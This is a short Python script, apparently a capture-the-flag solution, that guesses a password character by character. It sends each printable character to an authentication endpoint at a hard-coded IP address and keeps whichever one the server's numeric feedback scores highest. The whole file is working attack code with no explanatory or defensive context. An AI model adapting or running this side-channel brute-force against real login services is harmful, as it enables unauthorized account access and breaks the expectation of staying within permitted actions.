import requests
import json
import string


# a-zA-Z!@$%^&*()_-=

printables_chars = string.printable

agent = 'ed9ae2c0-9b15-4556-a393-23d500675d4b'
num = -1
isValid = ""
ch = 'y'
for i, char in enumerate(printables_chars):
    print('run {}. char {}'.format(i, char))
    result = requests.post('http://35.246.158.51:8070/auth/v1_1',
                           data={"Seed": "d14236b60e0f4aef94499cb648a5f522", "Password": char})
#    print(result.text)

    numStr = result.text.split(':', 3)
    currentNum = numStr[len(numStr)-1][:-1]
    if int(currentNum) > num:

        isValid = numStr[1]
        ch = char
        num = int(currentNum)
print("@{}@{}@".format(num, ch))
# print(isValid)